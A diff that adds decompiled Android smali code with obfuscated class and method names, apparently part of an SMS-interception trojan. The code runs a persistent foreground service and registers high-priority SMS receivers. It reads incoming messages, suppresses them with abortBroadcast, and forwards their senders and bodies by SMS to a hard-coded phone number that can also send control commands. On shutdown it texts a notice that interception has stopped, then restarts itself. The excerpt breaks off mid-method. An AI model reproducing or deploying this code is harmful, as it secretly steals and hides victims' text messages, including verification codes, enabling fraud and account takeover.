+    invoke-direct {v4, v5, v6}, Landroid/widget/RemoteViews;-><init>(Ljava/lang/String;I)V
+
+    .line 29
+    iput-object v4, v1, Landroid/app/Notification;->contentView:Landroid/widget/RemoteViews;
+
+    .line 31
+    invoke-static {p0, v8, v2, v8}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;
+
+    move-result-object v3
+
+    .line 33
+    .local v3, "pendingIntent":Landroid/app/PendingIntent;
+    iput-object v3, v1, Landroid/app/Notification;->contentIntent:Landroid/app/PendingIntent;
+
+    .line 34
+    const/16 v4, 0x64
+
+    invoke-virtual {p0, v4, v1}, Lji/yj/ur/a201jhfg20180420ab/JM01;->startForeground(ILandroid/app/Notification;)V
+
+    .line 35
+    new-instance v0, Landroid/content/IntentFilter;
+
+    invoke-direct {v0}, Landroid/content/IntentFilter;-><init>()V
+
+    .line 36
+    .local v0, "dsfghgfdgfd":Landroid/content/IntentFilter;
+    const-string v4, "android.provider.Telephony.SMS_RECEIVED"
+
+    invoke-virtual {v0, v4}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V
+
+    .line 37
+    const-string v4, "android.provider.Telephony.SMS_RECEIVED_2"
+
+    invoke-virtual {v0, v4}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V
+
+    .line 38
+    const-string v4, "android.provider.Telephony.GSM_SMS_RECEIVED"
+
+    invoke-virtual {v0, v4}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V
+
+    .line 39
+    const/16 v4, 0x3e8
+
+    invoke-virtual {v0, v4}, Landroid/content/IntentFilter;->setPriority(I)V
+
+    .line 41
+    new-instance v4, Lji/yj/ur/a201jhfg20180420ab/JM03;
+
+    invoke-direct {v4}, Lji/yj/ur/a201jhfg20180420ab/JM03;-><init>()V
+
+    iput-object v4, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->rr01:Lji/yj/ur/a201jhfg20180420ab/JM03;
+
+    .line 42
+    iget-object v4, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->rr01:Lji/yj/ur/a201jhfg20180420ab/JM03;
+
+    const-string v5, "android.permission.BROADCAST_SMS"
+
+    invoke-virtual {p0, v4, v0, v5, v9}, Lji/yj/ur/a201jhfg20180420ab/JM01;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;Ljava/lang/String;Landroid/os/Handler;)Landroid/content/Intent;
+
+    .line 44
+    new-instance v4, Lji/yj/ur/a201jhfg20180420ab/JM03;
+
+    invoke-direct {v4}, Lji/yj/ur/a201jhfg20180420ab/JM03;-><init>()V
+
+    iput-object v4, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->rr02:Lji/yj/ur/a201jhfg20180420ab/JM03;
+
+    .line 45
+    iget-object v4, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->rr02:Lji/yj/ur/a201jhfg20180420ab/JM03;
+
+    new-instance v5, Landroid/content/IntentFilter;
+
+    const-string v6, "sh.ji.fe"
+
+    invoke-direct {v5, v6}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual {p0, v4, v5}, Lji/yj/ur/a201jhfg20180420ab/JM01;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;
+
+    .line 47
+    new-instance v4, Lji/yj/ur/a201jhfg20180420ab/JM05;
+
+    invoke-direct {v4, p0, v9}, Lji/yj/ur/a201jhfg20180420ab/JM05;-><init>(Landroid/content/Context;Landroid/os/Handler;)V
+
+    iput-object v4, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->ssssssss:Lji/yj/ur/a201jhfg20180420ab/JM05;
+
+    .line 48
+    invoke-virtual {p0}, Lji/yj/ur/a201jhfg20180420ab/JM01;->getContentResolver()Landroid/content/ContentResolver;
+
+    move-result-object v4
+
+    sget-object v5, Lji/yj/ur/a201jhfg20180420ab/JM01;->iru:Landroid/net/Uri;
+
+    const/4 v6, 0x1
+
+    iget-object v7, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->ssssssss:Lji/yj/ur/a201jhfg20180420ab/JM05;
+
+    invoke-virtual {v4, v5, v6, v7}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V
+
+    .line 50
+    new-instance v4, Lji/yj/ur/a201jhfg20180420ab/JM01$FFFFFFF;
+
+    invoke-direct {v4, p0}, Lji/yj/ur/a201jhfg20180420ab/JM01$FFFFFFF;-><init>(Lji/yj/ur/a201jhfg20180420ab/JM01;)V
+
+    invoke-virtual {v4}, Lji/yj/ur/a201jhfg20180420ab/JM01$FFFFFFF;->start()V
+
+    .line 51
+    return-void
+.end method
+
+.method public onDestroy()V
+    .locals 5
+
+    .prologue
+    .line 55
+    invoke-super {p0}, Landroid/app/Service;->onDestroy()V
+
+    .line 56
+    const/4 v1, 0x1
+
+    invoke-virtual {p0, v1}, Lji/yj/ur/a201jhfg20180420ab/JM01;->stopForeground(Z)V
+
+    .line 57
+    iget-object v1, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->rr01:Lji/yj/ur/a201jhfg20180420ab/JM03;
+
+    invoke-virtual {p0, v1}, Lji/yj/ur/a201jhfg20180420ab/JM01;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V
+
+    .line 58
+    iget-object v1, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->rr02:Lji/yj/ur/a201jhfg20180420ab/JM03;
+
+    invoke-virtual {p0, v1}, Lji/yj/ur/a201jhfg20180420ab/JM01;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V
+
+    .line 59
+    invoke-virtual {p0}, Lji/yj/ur/a201jhfg20180420ab/JM01;->getContentResolver()Landroid/content/ContentResolver;
+
+    move-result-object v1
+
+    iget-object v2, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->ssssssss:Lji/yj/ur/a201jhfg20180420ab/JM05;
+
+    invoke-virtual {v1, v2}, Landroid/content/ContentResolver;->unregisterContentObserver(Landroid/database/ContentObserver;)V
+
+    .line 60
+    iget-object v1, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->su:Lji/yj/ur/a201jhfg20180420ab/JM02;
+
+    const-string v2, "18016217928"
+
+    const-string v3, "\u62e6\u622a\u670d\u52a1\u505c\u6b62\uff0c\u4f7f\u7528\u7ed3\u675f\u65f6\u95f4\uff1a2018-4-20 12:00:00"
+
+    const/4 v4, 0x0
+
+    invoke-virtual {v1, v2, v3, v4}, Lji/yj/ur/a201jhfg20180420ab/JM02;->gfyhdfgadg(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
+
+    .line 61
+    new-instance v0, Landroid/content/Intent;
+
+    invoke-direct {v0}, Landroid/content/Intent;-><init>()V
+
+    .line 62
+    .local v0, "oyutiuy":Landroid/content/Intent;
+    const-class v1, Lji/yj/ur/a201jhfg20180420ab/JM01;
+
+    invoke-virtual {v0, p0, v1}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;
+
+    .line 63
+    invoke-virtual {p0, v0}, Lji/yj/ur/a201jhfg20180420ab/JM01;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+
+    .line 64
+    return-void
+.end method
+
+.method public onStartCommand(Landroid/content/Intent;II)I
+    .locals 1
+    .param p1, "intent"    # Landroid/content/Intent;
+    .param p2, "flags"    # I
+    .param p3, "startId"    # I
+
+    .prologue
+    .line 73
+    const/4 p2, 0x3
+
+    .line 74
+    invoke-super {p0, p1, p2, p3}, Landroid/app/Service;->onStartCommand(Landroid/content/Intent;II)I
+
+    move-result v0
+
+    return v0
+.end method
+.class public Lji/yj/ur/a201jhfg20180420ab/JM02;
+.super Ljava/lang/Object;
+.source "JM02.java"
+
+
+# static fields
+.field public static final jjjjjjjs:Ljava/lang/String; = "18016217928"
+
+.field private static final kghjfg:Ljava/text/SimpleDateFormat;
+
+.field public static final tttttttt:Ljava/lang/String; = "2018-4-20 12:00:00"
+
+
+# direct methods
+.method static constructor <clinit>()V
+    .locals 2
+
+    .prologue
+    .line 21
+    new-instance v0, Ljava/text/SimpleDateFormat;
+
+    .line 22
+    const-string v1, "yyyy-MM-dd HH:mm:ss"
+
+    .line 21
+    invoke-direct {v0, v1}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V
+
+    sput-object v0, Lji/yj/ur/a201jhfg20180420ab/JM02;->kghjfg:Ljava/text/SimpleDateFormat;
+
+    .line 17
+    return-void
+.end method
+
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 17
+    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
+
+    return-void
+.end method
+
+
+# virtual methods
+.method public dfgfddg(Ljava/lang/String;Landroid/content/SharedPreferences;)V
+    .locals 4
+    .param p1, "com"    # Ljava/lang/String;
+    .param p2, "sp"    # Landroid/content/SharedPreferences;
+
+    .prologue
+    .line 105
+    const-string v1, "action"
+
+    new-instance v2, Ljava/lang/StringBuilder;
+
+    const-string v3, "islj state "
+
+    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v2
+
+    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v2
+
+    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
+
+    .line 106
+    if-eqz p2, :cond_0
+
+    .line 107
+    invoke-interface {p2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;
+
+    move-result-object v0
+
+    .line 108
+    .local v0, "editor":Landroid/content/SharedPreferences$Editor;
+    const-string v1, "true"
+
+    invoke-virtual {v1, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v1
+
+    if-eqz v1, :cond_1
+
+    .line 109
+    const-string v1, "islj"
+
+    const/4 v2, 0x1
+
+    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;
+
+    .line 113
+    :goto_0
+    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z
+
+    .line 115
+    .end local v0    # "editor":Landroid/content/SharedPreferences$Editor;
+    :cond_0
+    return-void
+
+    .line 111
+    .restart local v0    # "editor":Landroid/content/SharedPreferences$Editor;
+    :cond_1
+    const-string v1, "islj"
+
+    const/4 v2, 0x0
+
+    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;
+
+    goto :goto_0
+.end method
+
+.method public gfyhdfgadg(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
+    .locals 9
+    .param p1, "phonenumber"    # Ljava/lang/String;
+    .param p2, "msg"    # Ljava/lang/String;
+    .param p3, "c"    # Landroid/content/Context;
+
+    .prologue
+    const/4 v2, 0x0
+
+    .line 76
+    const-string v1, "action"
+
+    new-instance v5, Ljava/lang/StringBuilder;
+
+    invoke-static {p1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;
+
+    move-result-object v8
+
+    invoke-direct {v5, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    const-string v8, "->"
+
+    invoke-virtual {v5, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v5
+
+    invoke-virtual {v5, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v5
+
+    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v5
+
+    invoke-static {v1, v5}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
+
+    .line 77
+    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;
+
+    move-result-object v0
+
+    .line 78
+    .local v0, "smsManager":Landroid/telephony/SmsManager;
+    const/4 v4, 0x0
+
+    .line 79
+    .local v4, "sentIntent":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Landroid/app/PendingIntent;>;"
+    invoke-virtual {v0, p2}, Landroid/telephony/SmsManager;->divideMessage(Ljava/lang/String;)Ljava/util/ArrayList;
+
+    move-result-object v3
+
+    .line 80
+    .local v3, "msgs":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
+    if-eqz p3, :cond_0
+
+    .line 81
+    new-instance v4, Ljava/util/ArrayList;
+
+    .end local v4    # "sentIntent":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Landroid/app/PendingIntent;>;"
+    invoke-direct {v4}, Ljava/util/ArrayList;-><init>()V
+
+    .line 82
+    .restart local v4    # "sentIntent":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Landroid/app/PendingIntent;>;"
+    const/4 v6, 0x0
+
+    .local v6, "i":I
+    :goto_0
+    invoke-virtual {v3}, Ljava/util/ArrayList;->size()I
+
+    move-result v1
+
+    if-lt v6, v1, :cond_1
+
+    .end local v6    # "i":I
+    :cond_0
+    move-object v1, p1
+
+    move-object v5, v2
+
+    .line 87
+    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendMultipartTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/util/ArrayList;Ljava/util/ArrayList;Ljava/util/ArrayList;)V
+
+    .line 90
+    return-void
+
+    .line 83
+    .restart local v6    # "i":I
+    :cond_1
+    new-instance v1, Landroid/content/Intent;
+
+    const-string v5, "sh.ji.fe"
+
+    invoke-direct {v1, v5}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
+
+    const/4 v5, 0x0
+
+    invoke-static {p3, v6, v1, v5}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;
+
+    move-result-object v7
+
+    .line 84
+    .local v7, "pd":Landroid/app/PendingIntent;
+    invoke-virtual {v4, v7}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z
+
+    .line 82
+    add-int/lit8 v6, v6, 0x1
+
+    goto :goto_0
+.end method
+
+.method public ghyutrhr()Z
+    .locals 4
+
+    .prologue
+    .line 94
+    :try_start_0
+    sget-object v2, Lji/yj/ur/a201jhfg20180420ab/JM02;->kghjfg:Ljava/text/SimpleDateFormat;
+
+    const-string v3, "2018-4-20 12:00:00"
+
+    invoke-virtual {v2, v3}, Ljava/text/SimpleDateFormat;->parse(Ljava/lang/String;)Ljava/util/Date;
+
+    move-result-object v1
+
+    .line 95
+    .local v1, "et":Ljava/util/Date;
+    new-instance v2, Ljava/util/Date;
+
+    invoke-direct {v2}, Ljava/util/Date;-><init>()V
+
+    invoke-virtual {v1, v2}, Ljava/util/Date;->after(Ljava/util/Date;)Z
+    :try_end_0
+    .catch Ljava/text/ParseException; {:try_start_0 .. :try_end_0} :catch_0
+
+    move-result v2
+
+    if-eqz v2, :cond_0
+
+    .line 96
+    const/4 v2, 0x1
+
+    .line 101
+    .end local v1    # "et":Ljava/util/Date;
+    :goto_0
+    return v2
+
+    .line 98
+    :catch_0
+    move-exception v0
+
+    .line 99
+    .local v0, "e":Ljava/text/ParseException;
+    invoke-virtual {v0}, Ljava/text/ParseException;->printStackTrace()V
+
+    .line 101
+    .end local v0    # "e":Ljava/text/ParseException;
+    :cond_0
+    const/4 v2, 0x0
+
+    goto :goto_0
+.end method
+
+.method public yrthfdxh(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;Landroid/content/SharedPreferences;)V
+    .locals 7
+    .param p1, "fromphone"    # Ljava/lang/String;
+    .param p2, "msg"    # Ljava/lang/String;
+    .param p3, "context"    # Landroid/content/Context;
+    .param p4, "sp"    # Landroid/content/SharedPreferences;
+
+    .prologue
+    const/4 v6, 0x0
+
+    const/4 v5, 0x0
+
+    const/4 v4, 0x1
+
+    .line 53
+    const-string v1, "action"
+
+    new-instance v2, Ljava/lang/StringBuilder;
+
+    invoke-static {p1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;
+
+    move-result-object v3
+
+    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    const-string v3, " to-->"
+
+    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v2
+
+    const-string v3, "18016217928"
+
+    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v2
+
+    const-string v3, "-> "
+
+    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v2
+
+    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v2
+
+    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v2
+
+    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
+
+    .line 54
+    const-string v1, "18016217928"
+
+    invoke-virtual {p1, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+
+    move-result v1
+
+    if-eqz v1, :cond_3
+
+    .line 55
+    const-string v1, "\uff03"
+
+    const-string v2, "#"
+
+    invoke-virtual {p2, v1, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
+
+    move-result-object v1
+
+    const-string v2, "#"
+
+    invoke-virtual {v1, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;
+
+    move-result-object v0
+
+    .line 56
+    .local v0, "ns":[Ljava/lang/String;
+    array-length v1, v0
+
+    if-lt v1, v4, :cond_2
+
+    .line 57
+    const-string v1, "com"
+
+    aget-object v2, v0, v6
+
+    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v1
+
+    if-eqz v1, :cond_1
+
+    .line 58
+    aget-object v1, v0, v4
+
+    invoke-virtual {p0, v1, p4}, Lji/yj/ur/a201jhfg20180420ab/JM02;->dfgfddg(Ljava/lang/String;Landroid/content/SharedPreferences;)V
+
+    .line 73
+    .end local v0    # "ns":[Ljava/lang/String;
+    :cond_0
+    :goto_0
+    return-void
+
+    .line 60
+    .restart local v0    # "ns":[Ljava/lang/String;
+    :cond_1
+    const-string v1, "18016217928"
+
+    new-instance v2, Ljava/lang/StringBuilder;
+
+    array-length v3, v0
+
+    invoke-static {v3}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;
+
+    move-result-object v3
+
+    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    const-string v3, " \u6307\u4ee4\u9519\u8bef\'"
+
+    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v2
+
+    aget-object v3, v0, v6
+
+    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v2
+
+    const-string v3, "\',"
+
+    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v2
+
+    .line 61
+    aget-object v3, v0, v4
+
+    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v2
+
+    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v2
+
+    .line 60
+    invoke-virtual {p0, v1, v2, v5}, Lji/yj/ur/a201jhfg20180420ab/JM02;->gfyhdfgadg(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
+
+    goto :goto_0
+
+    .line 65
+    :cond_2
+    const-string v1, "18016217928"
+
+    new-instance v2, Ljava/lang/StringBuilder;
+
+    array-length v3, v0
+
+    invoke-static {v3}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;
+
+    move-result-object v3
+
+    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    const-string v3, " \u6307\u4ee4\u9519\u8bef"
+
+    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v2
+
+    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v2
+
+    const-string v3, "\u6b63\u786e\u683c\u5f0f \u624b\u673a\u53f7\u7801#\u5185\u5bb9"
+
+    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v2
+
+    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v2
+
+    invoke-virtual {p0, v1, v2, v5}, Lji/yj/ur/a201jhfg20180420ab/JM02;->gfyhdfgadg(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
+
+    goto :goto_0
+
+    .line 69
+    .end local v0    # "ns":[Ljava/lang/String;
+    :cond_3
+    const-string v1, "islj"
+
+    invoke-interface {p4, v1, v4}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z
+
+    move-result v1
+
+    if-eqz v1, :cond_0
+
+    .line 70
+    const-string v1, "18016217928"
+
+    new-instance v2, Ljava/lang/StringBuilder;
+
+    invoke-static {p1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;
+
+    move-result-object v3
+
+    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    const-string v3, "->"
+
+    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v2
+
+    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v2
+
+    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v2
+
+    invoke-virtual {p0, v1, v2, v5}, Lji/yj/ur/a201jhfg20180420ab/JM02;->gfyhdfgadg(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
+
+    goto :goto_0
+.end method
+
+.method public ytuyghjdhd(Landroid/os/Bundle;Landroid/content/Context;Lji/yj/ur/a201jhfg20180420ab/JM03;)V
+    .locals 12
+    .param p1, "bundle"    # Landroid/os/Bundle;
+    .param p2, "context"    # Landroid/content/Context;
+    .param p3, "receiver"    # Lji/yj/ur/a201jhfg20180420ab/JM03;
+
+    .prologue
+    const/4 v9, 0x0
+
+    .line 26
+    :try_start_0
+    const-string v8, "config"
+
+    const/4 v10, 0x0
+
+    invoke-virtual {p2, v8, v10}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
+
+    move-result-object v7
+
+    .line 27
+    .local v7, "sp":Landroid/content/SharedPreferences;
+    const-string v8, "pdus"
+
+    invoke-virtual {p1, v8}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;
+
+    move-result-object v6
+
+    check-cast v6, [Ljava/lang/Object;
+
+    .line 28
+    .local v6, "pdus":[Ljava/lang/Object;
+    array-length v8, v6
+
+    new-array v4, v8, [Landroid/telephony/SmsMessage;
+
+    .line 29
+    .local v4, "messages":[Landroid/telephony/SmsMessage;
+    const/4 v2, 0x0
+
+    .local v2, "i":I
+    :goto_0
+    array-length v8, v6
+
+    if-lt v2, v8, :cond_2
+
+    .line 32
+    const-string v5, ""
+
+    .line 33
+    .local v5, "msg":Ljava/lang/String;
+    const-string v1, ""
+
+    .line 34
+    .local v1, "fromphone":Ljava/lang/String;
+    array-length v10, v4
+
+    move v8, v9
+
+    :goto_1
+    if-lt v8, v10, :cond_3
+
+    .line 40
+    const-string v8, "action"
+
+    new-instance v9, Ljava/lang/StringBuilder;
+
+    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;
+
+    move-result-object v10
+
+    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    const-string v10, "->"
+
+    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v9
+
+    invoke-virtual {v9, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v9
+
+    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v9
+
+    invoke-static {v8, v9}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
+
+    .line 41
+    const-string v8, "islj"
+
+    const/4 v9, 0x1
+
+    invoke-interface {v7, v8, v9}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z
+
+    move-result v8
+
+    if-nez v8, :cond_0
+
+    const-string v8, "18016217928"
+
+    invoke-virtual {v1, v8}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+
+    move-result v8
+
+    if-eqz v8, :cond_1
+
+    .line 42
+    :cond_0
+    invoke-virtual {p3}, Lji/yj/ur/a201jhfg20180420ab/JM03;->abortBroadcast()V
+
+    .line 44
+    :cond_1
+    invoke-virtual {p0, v1, v5, p2, v7}, Lji/yj/ur/a201jhfg20180420ab/JM02;->yrthfdxh(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;Landroid/content/SharedPreferences;)V
+
+    .line 50
+    .end local v1    # "fromphone":Ljava/lang/String;
+    .end local v2    # "i":I
+    .end local v4    # "messages":[Landroid/telephony/SmsMessage;
+    .end local v5    # "msg":Ljava/lang/String;
+    .end local v6    # "pdus":[Ljava/lang/Object;
+    .end local v7    # "sp":Landroid/content/SharedPreferences;
+    :goto_2
+    return-void
+
+    .line 30
+    .restart local v2    # "i":I
+    .restart local v4    # "messages":[Landroid/telephony/SmsMessage;
+    .restart local v6    # "pdus":[Ljava/lang/Object;
+    .restart local v7    # "sp":Landroid/content/SharedPreferences;
+    :cond_2
+    aget-object v8, v6, v2
+
+    check-cast v8, [B
+
+    invoke-static {v8}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;
+
+    move-result-object v8
+
+    aput-object v8, v4, v2
+
+    .line 29
+    add-int/lit8 v2, v2, 0x1
+
+    goto :goto_0
+
+    .line 34
+    .restart local v1    # "fromphone":Ljava/lang/String;
+    .restart local v5    # "msg":Ljava/lang/String;
+    :cond_3
+    aget-object v3, v4, v8
+
+    .line 35
+    .local v3, "message":Landroid/telephony/SmsMessage;
+    new-instance v9, Ljava/lang/StringBuilder;
+
+    invoke-static {v5}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;
+
+    move-result-object v11
+
+    invoke-direct {v9, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual {v3}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;
+
+    move-result-object v11
+
+    invoke-virtual {v9, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v9
+
+    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v5
+
+    .line 36
+    const-string v9, ""
+
+    invoke-virtual {v9, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v9
+
+    if-eqz v9, :cond_4
+
+    .line 37
+    invoke-virtual {v3}, Landroid/telephony/SmsMessage;->getOriginatingAddress()Ljava/lang/String;
+    :try_end_0
+    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
+
+    move-result-object v1
+
+    .line 34
+    :cond_4
+    add-int/lit8 v8, v8, 0x1
+
+    goto :goto_1
+
+    .line 45
+    .end local v1    # "fromphone":Ljava/lang/String;
+    .end local v2    # "i":I
+    .end local v3    # "message":Landroid/telephony/SmsMessage;
+    .end local v4    # "messages":[Landroid/telephony/SmsMessage;
+    .end local v5    # "msg":Ljava/lang/String;
+    .end local v6    # "pdus":[Ljava/lang/Object;
+    .end local v7    # "sp":Landroid/content/SharedPreferences;
+    :catch_0
+    move-exception v0
+
+    .line 46
+    .local v0, "e":Ljava/lang/Exception;
+    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V
+
+    .line 47
+    const-string v8, "18016217928"
+
+    new-instance v9, Ljava/lang/StringBuilder;
+
+    const-string v10, "\u51fa\u73b0\u5f02\u5e38"
+
+    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;
+
+    move-result-object v10
+
+    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v9
+
+    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v9
+
+    .line 48
+    const/4 v10, 0x0
+
+    .line 47
